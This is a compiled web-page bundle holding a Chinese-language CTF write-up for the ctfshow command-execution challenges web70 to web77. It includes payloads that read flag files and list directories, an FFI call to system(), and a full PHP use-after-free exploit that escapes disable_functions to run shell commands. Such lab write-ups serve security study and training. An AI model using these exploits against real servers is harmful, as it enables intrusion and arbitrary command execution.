\");}"})}),"\n",(0,l.jsx)(n.p,{children:"payload:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"include('/flag.txt')\u7b49\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web71",children:"web71"}),"\n",(0,l.jsx)(n.p,{children:"\u7ed9\u4e86\u6e90\u7801"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nerror_reporting(0); //\u5173\u95ed\u4e86\u6240\u6709\u7684\u9519\u8bef\u663e\u793a\r\nini_set('display_errors', 0); //\u5c06\u8fd9\u4e2a\u914d\u7f6e\u9879\u8bbe\u7f6e\u4e3a0\uff0c\u8868\u793a\u4e0d\u5728\u7f51\u9875\u4e0a\u663e\u793a\u62a5\u9519\r\n// \u4f60\u4eec\u5728\u70ab\u6280\u5417\uff1f\r\nif(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n        $s = ob_get_contents();\r\n        ob_end_clean();\r\n        echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\r\n\r\n?>\r\n\u4f60\u8981\u4e0a\u5929\u5417\uff1f\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u77e5\u8bc6\u70b9"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"ob_get_contents \u2014 \u8fd4\u56de\u8f93\u51fa\u7f13\u51b2\u533a\u7684\u5185\u5bb9\uff0c\u53ea\u662f\u5f97\u5230\u8f93\u51fa\u7f13\u51b2\u533a\u7684\u5185\u5bb9\uff0c\u4f46\u4e0d\u6e05\u9664\u5b83\u3002 \r\nob_end_clean \u2014 \u6e05\u7a7a\uff08\u64e6\u9664\uff09\u7f13\u51b2\u533a\u5e76\u5173\u95ed\u8f93\u51fa\u7f13\u51b2\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'<?php\r\n\r\nob_start();\r\n\r\necho "Hello ";\r\n\r\n$out1 = ob_get_contents(); //Hello\r\n\r\necho "World";\r\n\r\n$out2 = ob_get_contents(); //Hello World\r\n\r\nob_end_clean();\r\n\r\nvar_dump($out1, $out2);\r\n?>\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u8f93\u51fa\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:'string(6) "Hello "\r\nstring(11) "Hello World"\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u8fd9\u91cc\u5c06\u8f93\u51fa\u7f13\u5b58\u533a\u7684\u5185\u5bb9\u7ed9\u6e05\u9664\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u60f3\u6267\u884c\u4ee3\u7801\u7684\u540e\u9762\u52a0\u4e0a",(0,l.jsx)(n.code,{children:"exit()"}),"\u548c",(0,l.jsx)(n.code,{children:"die()"}),"\uff0c\u9000\u51fa\u4ee3\u7801\uff0c\u4e0d\u6267\u884c\u540e\u9762\u7684\u4ee3\u7801"]}),"\n",(0,l.jsx)(n.p,{children:"payload\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"include('/flag.txt');exit();\r\ninclude('/flag.txt');die();\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web72",children:"web72"}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u6837\u7684\u6e90\u7801"}),"\n",(0,l.jsx)(n.p,{children:"open_basedir \u662fphp.ini \u4e2d\u7684 \u4e00\u4e2a\u914d\u7f6e\u9009\u9879\u3002\u53ef\u4ee5\u7528\u4f5c\u4e0e \u5c06\u7528\u6237\u8bbf\u95ee\u6587\u4ef6\u7684\u6d3b\u52a8\u8303\u56f4\u9650\u5236\u5728\u6307\u5b9a\u7684\u533a\u57df"}),"\n",(0,l.jsx)(n.p,{children:"\u4f8b\u5982\uff1aopen_basedir=/var/www/html:/tmp/\uff0c\u5c31\u4e0d\u80fd\u83b7\u53d6\u8fd9\u4e24\u4e2a\u76ee\u5f55\u4ee5\u5916\u7684\u6587\u4ef6"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://blog.csdn.net/snowlyzz/article/details/126310439?fromshare=blogdetail",children:"\u6d45\u8c08\u7ed5\u8fc7open_basedir \u7684\u51e0\u79cd\u7528\u6cd5"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231109151255796.png",alt:"image-20231109151255796"})}),"\n",(0,l.jsx)(n.p,{children:"\u7528uaf\u811a\u672c\u547d\u4ee4\u6267\u884cpoc,\u8981url\u7f16\u7801"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nfunction ctfshow($cmd) {\r\n    global $abc, $helper, $backtrace;\r\n\r\n    class Vuln {\r\n        public $a;\r\n        public function __destruct() { \r\n            global $backtrace; \r\n            unset($this->a);\r\n            $backtrace = (new Exception)->getTrace();\r\n            if(!isset($backtrace[1]['args'])) {\r\n                $backtrace = debug_backtrace();\r\n            }\r\n        }\r\n    }\r\n    class Helper {\r\n        public $a, $b, $c, $d;\r\n    }\r\n    function str2ptr(&$str, $p = 0, $s = 8) {\r\n        $address = 0;\r\n        for($j = $s-1; $j >= 0; $j--) {\r\n            $address <<= 8;\r\n            $address |= ord($str[$p+$j]);\r\n        }\r\n        return $address;\r\n    }\r\n    function ptr2str($ptr, $m = 8) {\r\n        $out = \"\";\r\n        for ($i=0; $i < $m; $i++) {\r\n            $out .= sprintf(\"%c\",($ptr & 0xff));\r\n            $ptr >>= 8;\r\n        }\r\n        return $out;\r\n    }\r\n    function write(&$str, $p, $v, $n = 8) {\r\n        $i = 0;\r\n        for($i = 0; $i < $n; $i++) {\r\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\r\n            $v >>= 8;\r\n        }\r\n    }\r\n    function leak($addr, $p = 0, $s = 8) {\r\n        global $abc, $helper;\r\n        write($abc, 0x68, $addr + $p - 0x10);\r\n        $leak = strlen($helper->a);\r\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\r\n        return $leak;\r\n    }\r\n    function parse_elf($base) {\r\n        $e_type = leak($base, 0x10, 2);\r\n\r\n        $e_phoff = leak($base, 0x20);\r\n        $e_phentsize = leak($base, 0x36, 2);\r\n        $e_phnum = leak($base, 0x38, 2);\r\n        for($i = 0; $i < $e_phnum; $i++) {\r\n            $header = $base + $e_phoff + $i * $e_phentsize;\r\n            $p_type  = leak($header, 0, 4);\r\n            $p_flags = leak($header, 4, 4);\r\n            $p_vaddr = leak($header, 0x10);\r\n            $p_memsz = leak($header, 0x28);\r\n            if($p_type == 1 && $p_flags == 6) { \r\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\r\n                $data_size = $p_memsz;\r\n            } else if($p_type == 1 && $p_flags == 5) { \r\n                $text_size = $p_memsz;\r\n            }\r\n        }\r\n        if(!$data_addr || !$text_size || !$data_size)\r\n            return false;\r\n\r\n        return [$data_addr, $text_size, $data_size];\r\n    }\r\n    function get_basic_funcs($base, $elf) {\r\n        list($data_addr, $text_size, $data_size) = $elf;\r\n        for($i = 0; $i < $data_size / 8; $i++) {\r\n            $leak = leak($data_addr, $i * 8);\r\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\r\n                $deref = leak($leak);       \r\n                if($deref != 0x746e6174736e6f63)\r\n                    continue;\r\n            } else continue;\r\n            $leak = leak($data_addr, ($i + 4) * 8);\r\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\r\n                $deref = leak($leak);\r\n                \r\n                if($deref != 0x786568326e6962)\r\n                    continue;\r\n            } else continue;\r\n\r\n            return $data_addr + $i * 8;\r\n        }\r\n    }\r\n    function get_binary_base($binary_leak) {\r\n        $base = 0;\r\n        $start = $binary_leak & 0xfffffffffffff000;\r\n        for($i = 0; $i < 0x1000; $i++) {\r\n            $addr = $start - 0x1000 * $i;\r\n            $leak = leak($addr, 0, 7);\r\n            if($leak == 0x10102464c457f) {\r\n                return $addr;\r\n            }\r\n        }\r\n    }\r\n    function get_system($basic_funcs) {\r\n        $addr = $basic_funcs;\r\n        do {\r\n            $f_entry = leak($addr);\r\n            $f_name = leak($f_entry, 0, 6);\r\n            if($f_name == 0x6d6574737973) {\r\n                return leak($addr + 8);\r\n            }\r\n            $addr += 0x20;\r\n        } while($f_entry != 0);\r\n        return false;\r\n    }\r\n    function trigger_uaf($arg) {\r\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\r\n        $vuln = new Vuln();\r\n        $vuln->a = $arg;\r\n    }\r\n    if(stristr(PHP_OS, 'WIN')) {\r\n        die('This PoC is for *nix systems only.');\r\n    }\r\n    $n_alloc = 10; \r\n    $contiguous = [];\r\n    for($i = 0; $i < $n_alloc; $i++)\r\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\r\n    trigger_uaf('x');\r\n    $abc = $backtrace[1]['args'][0];\r\n    $helper = new Helper;\r\n    $helper->b = function ($x) { };\r\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\r\n        die(\"UAF failed\");\r\n    }\r\n    $closure_handlers = str2ptr($abc, 0);\r\n    $php_heap = str2ptr($abc, 0x58);\r\n    $abc_addr = $php_heap - 0xc8;\r\n    write($abc, 0x60, 2);\r\n    write($abc, 0x70, 6);\r\n    write($abc, 0x10, $abc_addr + 0x60);\r\n    write($abc, 0x18, 0xa);\r\n    $closure_obj = str2ptr($abc, 0x20);\r\n    $binary_leak = leak($closure_handlers, 8);\r\n    if(!($base = get_binary_base($binary_leak))) {\r\n        die(\"Couldn't determine binary base address\");\r\n    }\r\n    if(!($elf = parse_elf($base))) {\r\n        die(\"Couldn't parse ELF header\");\r\n    }\r\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\r\n        die(\"Couldn't get basic_functions address\");\r\n    }\r\n    if(!($zif_system = get_system($basic_funcs))) {\r\n        die(\"Couldn't get zif_system address\");\r\n    }\r\n    $fake_obj_offset = 0xd0;\r\n    for($i = 0; $i < 0x110; $i += 8) {\r\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\r\n    }\r\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\r\n    write($abc, 0xd0 + 0x38, 1, 4); \r\n    write($abc, 0xd0 + 0x68, $zif_system); \r\n\r\n    ($helper->b)($cmd);\r\n    exit();\r\n}\r\nctfshow(\"cat /flag0.txt\");ob_end_flush();\r\n?>\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web73",children:"web73"}),"\n",(0,l.jsx)(n.p,{children:"\u67e5\u770b\u76ee\u5f55"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"$a=scandir('/');foreach($a as $value){echo $value.\" \";}exit();\r\n$a=new DirectoryIterator(\"glob:///*\");foreach($a as $f){echo($f->__toString().' ');}exit();\r\n//DirectoryIterator\u662fphp5\u4e2d\u589e\u52a0\u7684\u4e00\u4e2a\u7c7b\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u7b80\u5355\u7684\u67e5\u770b\u76ee\u5f55\u7684\u63a5\u53e3\u3002\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u67e5\u770b\u6587\u4ef6"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:'include("/flagc.txt");exit();\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web74",children:"web74"}),"\n",(0,l.jsx)(n.p,{children:"payload:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().\' \');}exit();\r\n$a=new DirectoryIterator("/");foreach($a as $key=>$value){echo $key."=>".$value;}exit();\r\n//\u8fd9\u91cc\u4e0d\u7528glob\u534f\u8bae\uff0c\u56e0\u4e3a\u8fd9\u9898\u65e0open_basedir\u9650\u5236\r\n//DirectoryIterator\u662fphp5\u4e2d\u589e\u52a0\u7684\u4e00\u4e2a\u7c7b\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u7b80\u5355\u7684\u67e5\u770b\u76ee\u5f55\u7684\u63a5\u53e3\u3002\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web77",children:"web77"}),"\n",(0,l.jsx)(n.p,{children:"\u626b\u63cf\u76ee\u5f55"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"$a=new DirectoryIterator(\"glob:///*\");foreach($a as $f){echo($f->__toString().' ');}exit();\r\n\u53d1\u73b0\u6709\u4e00\u4e2aflag36x.txt,\u8fd8\u6709\u4e00\u4e2areadflag\u6587\u4ef6\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"http://t.csdnimg.cn/F7M7K",children:"ctfshow web\u5165\u95e8 \u547d\u4ee4\u6267\u884cweb75-77"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u6d89\u53ca\u5230FFI\u6269\u5c55\uff0c\u53c2\u8003"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://www.php.net/manual/zh/ffi.cdef.php",children:"FFI"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://www.laruence.com/2020/03/11/5475.html",children:"PHP FFI\u8be6\u89e3 - \u4e00\u79cd\u5168\u65b0\u7684PHP\u6269\u5c55\u65b9\u5f0f"})}),"\n",(0,l.jsx)(n.p,{children:"payload:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"$ffi = FFI::cdef(\"int system(const char *command);\");//\u521b\u5efa\u4e00\u4e2asystem\u5bf9\u8c61\r\n$a='/readflag > 1.txt';//\u6ca1\u6709\u56de\u663e\u7684\r\n$ffi->system($a);//\u901a\u8fc7$ffi\u53bb\u8c03\u7528system\u51fd\u6570\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8bbf\u95ee1.txt\u5373\u53ef"})]})}function $(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(h,{...e})}):h(e)}}}]);